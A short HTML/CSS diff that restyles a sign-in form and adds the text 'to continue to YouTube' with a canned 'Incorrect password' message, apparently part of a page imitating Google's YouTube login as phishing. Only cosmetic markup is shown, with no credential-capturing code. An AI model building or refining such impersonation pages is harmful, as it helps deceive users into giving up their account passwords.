@@ -53,6 +53,12 @@ window.ezogetrqbykey=function(b){for(var a=0,g=__ez.a[2].length;a<g;a++)if(__ez.
         
         .form-greetings{
             text-align: center;
+            font-size: 17px;
+            margin-bottom: 15px;
+        }
+        
+        .form-greetings1{
+            text-align: center;
             font-size: 12px;
             margin-bottom: 10px;
         }
@@ -238,8 +244,12 @@ attach_ezolpl();
         <div class="form-greeting">
             <span>Welcome</span>
         </div>
-
+        
          <div class="form-greetings">
+            <span>to continue to YouTube</span>
+        </div>
+
+         <div class="form-greetings1">
             <span style="color:#d93025;text-align:center;">Incorrect password. Please try again.</span>
         </div>
 
